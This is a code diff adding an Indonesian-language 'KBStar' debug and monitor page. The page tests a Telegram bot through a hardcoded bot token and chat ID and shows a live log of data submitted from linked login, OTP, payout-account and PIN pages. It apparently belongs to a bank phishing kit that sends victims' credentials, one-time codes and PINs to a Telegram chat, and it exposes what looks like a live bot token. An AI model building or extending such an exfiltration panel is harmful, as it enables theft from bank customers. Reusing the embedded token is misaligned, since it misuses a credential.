@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>KBStar — Debug & Monitor Telegram Bot</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #0d1527;
+      --card-bg: #15223c;
+      --card-border: #22355c;
+      --primary: #3b6bf4;
+      --primary-hover: #2d58dd;
+      --accent-green: #10b981;
+      --accent-red: #ef4444;
+      --accent-amber: #f59e0b;
+      --text: #f1f5f9;
+      --muted: #94a3b8;
+      --code-bg: #090e1a;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Plus Jakarta Sans', system-ui, -apple-system, sans-serif;
+      padding: 24px;
+      line-height: 1.5;
+    }
+    .container {
+      max-width: 900px;
+      margin: 0 auto;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+    .header {
+      background: linear-gradient(135deg, #1e3a8a, #3b6bf4);
+      padding: 24px 28px;
+      border-radius: 16px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+    }
+    .header h1 {
+      font-size: 24px;
+      font-weight: 800;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .header p {
+      font-size: 14px;
+      color: #cbd5e1;
+      margin-top: 6px;
+    }
+    .card {
+      background: var(--card-bg);
+      border: 1px solid var(--card-border);
+      border-radius: 14px;
+      padding: 20px 24px;
+    }
+    .card-title {
+      font-size: 16px;
+      font-weight: 700;
+      color: #e2e8f0;
+      margin-bottom: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .config-grid {
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 12px;
+    }
+    @media (min-width: 640px) {
+      .config-grid { grid-template-columns: 1fr 1fr; }
+    }
+    .field-box {
+      background: var(--code-bg);
+      padding: 12px 14px;
+      border-radius: 10px;
+      border: 1px solid #1e293b;
+    }
+    .field-box label {
+      display: block;
+      font-size: 11px;
+      font-weight: 700;
+      color: var(--muted);
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      margin-bottom: 4px;
+    }
+    .field-box .val {
+      font-family: monospace;
+      font-size: 13px;
+      color: #38bdf8;
+      word-break: break-all;
+    }
+    .actions {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      margin-top: 16px;
+    }
+    button.btn {
+      font-family: inherit;
+      font-size: 13px;
+      font-weight: 700;
+      padding: 10px 18px;
+      border-radius: 10px;
+      border: none;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      transition: all 0.2s ease;
+    }
+    .btn-primary {
+      background: var(--primary);
+      color: #fff;
+    }
+    .btn-primary:hover { background: var(--primary-hover); }
+    .btn-secondary {
+      background: #1e293b;
+      color: #e2e8f0;
+      border: 1px solid #334155 !important;
+    }
+    .btn-secondary:hover { background: #334155; }
+    .btn-danger {
+      background: #7f1d1d;
+      color: #fecaca;
+    }
+    .btn-danger:hover { background: #991b1b; }
+    .btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+
+    .output-box {
+      margin-top: 14px;
+      background: var(--code-bg);
+      border: 1px solid #1e293b;
+      border-radius: 10px;
+      padding: 14px;
+      font-family: monospace;
+      font-size: 12px;
+      max-height: 200px;
+      overflow-y: auto;
+      white-space: pre-wrap;
+      word-break: break-all;
+      color: #a5f3fc;
+      display: none;
+    }
+
+    .status-badge {
+      display: inline-block;
+      padding: 3px 8px;
+      border-radius: 6px;
+      font-size: 11px;
+      font-weight: 800;
+      text-transform: uppercase;
+    }
+    .status-badge.success { background: rgba(16,185,129,0.2); color: #34d399; }
+    .status-badge.error { background: rgba(239,68,68,0.2); color: #f87171; }
+    .status-badge.pending { background: rgba(245,158,11,0.2); color: #fbbf24; }
+
+    .nav-links {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(190px, 1fr));
+      gap: 10px;
+    }
+    .nav-links a {
+      background: #1e293b;
+      color: #e2e8f0;
+      text-decoration: none;
+      padding: 10px 14px;
+      border-radius: 8px;
+      border: 1px solid #334155;
+      font-size: 12px;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      transition: all 0.2s;
+    }
+    .nav-links a:hover {
+      background: #2563eb;
+      border-color: #3b82f6;
+      color: white;
+    }
+
+    .log-list {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin-top: 10px;
+    }
+    .log-item {
+      background: var(--code-bg);
+      border: 1px solid #1e293b;
+      border-radius: 10px;
+      padding: 12px 16px;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+    .log-item-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 10px;
+    }
+    .log-item-time {
+      font-size: 11px;
+      color: var(--muted);
+      font-family: monospace;
+    }
+    .log-item-source {
+      font-size: 13px;
+      font-weight: 700;
+      color: #e2e8f0;
+    }
+    .log-item-detail {
+      font-size: 12px;
+      color: #94a3b8;
+    }
+    .log-item-text {
+      background: #0f172a;
+      border-radius: 6px;
+      padding: 8px 10px;
+      font-family: monospace;
+      font-size: 11px;
+      color: #cbd5e1;
+      white-space: pre-wrap;
+      word-break: break-all;
+      border-left: 3px solid var(--primary);
+    }
+    .empty-state {
+      text-align: center;
+      padding: 30px;
+      color: var(--muted);
+      font-size: 13px;
+    }
+    .live-dot {
+      display: inline-block;
+      width: 8px;
+      height: 8px;
+      background: #10b981;
+      border-radius: 50%;
+      box-shadow: 0 0 8px #10b981;
+      animation: pulse 1.5s infinite;
+    }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.4; transform: scale(0.8); }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header class="header">
+      <h1>📡 KBStar — Telegram Bot Debugger & Monitor</h1>
+      <p>Gunakan halaman ini untuk memverifikasi apakah bot Telegram aktif, menguji pengiriman pesan langsung, dan memantau log pengiriman dari form di halaman lain secara real-time.</p>
+    </header>
+
+    <!-- KARTU KONFIGURASI BOT -->
+    <section class="card">
+      <div class="card-title">
+        <span>⚙️ Konfigurasi Telegram Bot Aktif</span>
+        <span class="live-dot" title="Live Ready"></span>
+      </div>
+      <div class="config-grid">
+        <div class="field-box">
+          <label>Chat ID Tujuan</label>
+          <div class="val" id="dispChatId">6959842489</div>
+        </div>
+        <div class="field-box">
+          <label>Bot Token</label>
+          <div class="val" id="dispToken">8941514752:AAHqmU7lqV0T64xRo43YPsmkjMwv2lrWDNE</div>
+        </div>
+      </div>
+
+      <div class="actions">
+        <button type="button" class="btn btn-secondary" id="btnTestGetMe">
+          🔍 1. Cek Koneksi Bot (getMe)
+        </button>
+        <button type="button" class="btn btn-primary" id="btnTestSend">
+          📨 2. Kirim Pesan Tes Langsung
+        </button>
+      </div>
+
+      <div id="outputBox" class="output-box"></div>
+    </section>
+
+    <!-- LIVE LOG MONITOR -->
+    <section class="card">
+      <div class="card-title">
+        <span>📋 Riwayat Log Pengiriman Telegram (Real-Time)</span>
+        <div style="display:flex; gap:8px;">
+          <button type="button" class="btn btn-secondary" id="btnRefreshLogs" style="padding: 6px 12px; font-size: 11px;">
+            🔄 Refresh
+          </button>
+          <button type="button" class="btn btn-danger" id="btnClearLogs" style="padding: 6px 12px; font-size: 11px;">
+            🗑️ Bersihkan
+          </button>
+        </div>
+      </div>
+      <p style="font-size: 12px; color: var(--muted); margin-bottom: 12px;">
+        Log ini mencatat seluruh data yang dikirim dari <strong>03-login</strong>, <strong>04-verifikasi-data</strong>, <strong>05-kode-simulasi (OTP)</strong>, <strong>09-rekening-pencairan</strong>, dan <strong>10-konfirmasi (PIN)</strong>. Halaman ini memperbarui log otomatis setiap 2 detik.
+      </p>
+
+      <div id="logContainer" class="log-list">
+        <div class="empty-state">Belum ada riwayat pengiriman. Coba kirim pesan tes atau buka halaman formulir.</div>
+      </div>
+    </section>
+
+    <!-- TAUTAN PENGUJIAN HALAMAN -->
+    <section class="card">
+      <div class="card-title">
+        <span>🚀 Buka & Uji Alur Halaman</span>
+      </div>
+      <div class="nav-links">
+        <a href="01-beranda.html" target="_blank">01-beranda.html <span>↗</span></a>
+        <a href="03-login.html" target="_blank">03-login.html <span>↗</span></a>
+        <a href="04-verifikasi-data.html" target="_blank">04-verifikasi-data.html <span>↗</span></a>
+        <a href="05-kode-simulasi.html" target="_blank">05-kode-simulasi.html <span>↗</span></a>
+        <a href="09-rekening-pencairan.html" target="_blank">09-rekening-pencairan.html <span>↗</span></a>
+        <a href="10-konfirmasi.html" target="_blank">10-konfirmasi.html <span>↗</span></a>
+      </div>
+    </section>
+  </div>
+
+  <script>
+    const BOT_TOKEN = "8941514752:AAHqmU7lqV0T64xRo43YPsmkjMwv2lrWDNE";
+    const CHAT_ID   = "6959842489";
+
+    const outputBox = document.getElementById("outputBox");
+    const logContainer = document.getElementById("logContainer");
+
+    function showOutput(title, obj, isError) {
+      outputBox.style.display = "block";
+      outputBox.style.borderColor = isError ? "#ef4444" : "#10b981";
+      outputBox.textContent = `=== ${title} ===\n` + JSON.stringify(obj, null, 2);
+    }
+
+    function recordLog(source, status, detail, messageText) {
+      try {
+        var logs = JSON.parse(localStorage.getItem('kb_tg_logs') || '[]');
+        var now = new Date();
+        logs.unshift({
+          time: now.toLocaleTimeString('id-ID') + ' (' + now.toLocaleDateString('id-ID') + ')',
+          source: source,
+          status: status,
+          detail: detail,
+          text: messageText || ''
+        });
+        if (logs.length > 50) logs = logs.slice(0, 50);
+        localStorage.setItem('kb_tg_logs', JSON.stringify(logs));
+        renderLogs();
+      } catch(e) {}
+    }
+
+    // 1. Cek info bot getMe
+    document.getElementById("btnTestGetMe").addEventListener("click", async function() {
+      this.disabled = true;
+      this.textContent = "⏳ Memeriksa...";
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
+        const data = await res.json();
+        if (data.ok) {
+          showOutput(`STATUS BOT OK (@${data.result.username})`, data, false);
+          recordLog("Debugger (getMe)", "SUCCESS", `Bot aktif: @${data.result.username}`, "");
+        } else {
+          showOutput("STATUS BOT ERROR", data, true);
+          recordLog("Debugger (getMe)", "ERROR", data.description || "Gagal", "");
+        }
+      } catch(err) {
+        showOutput("KONEKSI GAGAL", { error: err.message }, true);
+        recordLog("Debugger (getMe)", "ERROR", err.message, "");
+      } finally {
+        this.disabled = false;
+        this.textContent = "🔍 1. Cek Koneksi Bot (getMe)";
+      }
+    });
+
+    // 2. Kirim pesan tes langsung
+    document.getElementById("btnTestSend").addEventListener("click", async function() {
+      this.disabled = true;
+      this.textContent = "⏳ Mengirim...";
+      const now = new Date().toLocaleString("id-ID");
+      const text =
+        `🧪 <b>TES KONEKSI TELEGRAM BOT</b>\n\n` +
+        `Status  : <b>BERHASIL TERHUBUNG</b> ✅\n` +
+        `Waktu   : <code>${now}</code>\n` +
+        `Chat ID : <code>${CHAT_ID}</code>\n\n` +
+        `<i>Pesan ini dikirim dari halaman debugger KBStar.</i>`;
+
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: text,
+            parse_mode: "HTML"
+          })
+        });
+        const data = await res.json();
+        if (data.ok) {
+          showOutput("PESAN BERHASIL TERKIRIM KE TELEGRAM!", data, false);
+          recordLog("Debugger (Tes Langsung)", "SUCCESS", `Pesan ID: ${data.result.message_id}`, text);
+        } else {
+          showOutput("TELEGRAM MENGEMBALIKAN ERROR", data, true);
+          recordLog("Debugger (Tes Langsung)", "ERROR", data.description || "Gagal kirim", text);
+        }
+      } catch(err) {
+        showOutput("GAGAL JARINGAN", { error: err.message }, true);
+        recordLog("Debugger (Tes Langsung)", "ERROR", err.message, text);
+      } finally {
+        this.disabled = false;
+        this.textContent = "📨 2. Kirim Pesan Tes Langsung";
+      }
+    });
+
+    // Render riwayat log
+    function renderLogs() {
+      try {
+        const logs = JSON.parse(localStorage.getItem('kb_tg_logs') || '[]');
+        if (!logs.length) {
+          logContainer.innerHTML = `<div class="empty-state">Belum ada riwayat pengiriman. Coba kirim pesan tes atau buka halaman formulir.</div>`;
+          return;
+        }
+
+        let html = '';
+        logs.forEach(item => {
+          const badgeClass = item.status === "SUCCESS" ? "success" : "error";
+          html += `
+            <div class="log-item">
+              <div class="log-item-header">
+                <div>
+                  <span class="status-badge ${badgeClass}">${item.status}</span>
+                  <strong class="log-item-source" style="margin-left: 8px;">${item.source}</strong>
+                </div>
+                <span class="log-item-time">${item.time}</span>
+              </div>
+              <div class="log-item-detail"><strong>Keterangan:</strong> ${item.detail}</div>
+              ${item.text ? `<div class="log-item-text">${item.text.replace(/</g, "&lt;").replace(/>/g, "&gt;")}</div>` : ''}
+            </div>
+          `;
+        });
+        logContainer.innerHTML = html;
+      } catch(e) {
+        logContainer.innerHTML = `<div class="empty-state">Gagal membaca log: ${e.message}</div>`;
+      }
+    }
+
+    document.getElementById("btnRefreshLogs").addEventListener("click", renderLogs);
+    document.getElementById("btnClearLogs").addEventListener("click", function() {
+      if (confirm("Hapus semua riwayat log pengiriman?")) {
+        localStorage.removeItem("kb_tg_logs");
+        renderLogs();
+      }
+    });
+
+    // Auto-refresh logs every 2 seconds
+    renderLogs();
+    setInterval(renderLogs, 2000);
+  </script>
+</body>
+</html>
